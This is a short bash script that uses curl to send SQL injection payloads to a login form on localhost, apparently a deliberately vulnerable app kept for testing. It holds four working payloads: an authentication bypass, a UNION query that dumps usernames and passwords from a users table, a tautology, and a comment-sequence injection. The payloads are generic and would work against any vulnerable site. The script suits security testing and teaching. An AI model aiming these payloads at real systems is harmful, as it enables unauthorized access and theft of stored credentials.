#!/bin/bash

# Example SQL Injection payloads for testing the vulnerable login form

TARGET_URL="http://localhost:5000/login"

echo "[*] Attempting classic authentication bypass..."
curl -s -X POST "$TARGET_URL" -d "username=admin' OR '1'='1&password=irrelevant"

echo -e "\n[*] Attempting UNION-based injection to enumerate users..."
curl -s -X POST "$TARGET_URL" -d "username=admin' UNION SELECT username, password FROM users--&password=irrelevant"

echo -e "\n[*] Attempting tautology-based injection..."
curl -s -X POST "$TARGET_URL" -d "username=' OR '1'='1&password="

echo -e "\n[*] Attempting comment sequence injection..."
curl -s -X POST "$TARGET_URL" -d "username=admin' -- &password="

echo -e "\n[*] Done. Review the responses above for signs of SQL injection vulnerability."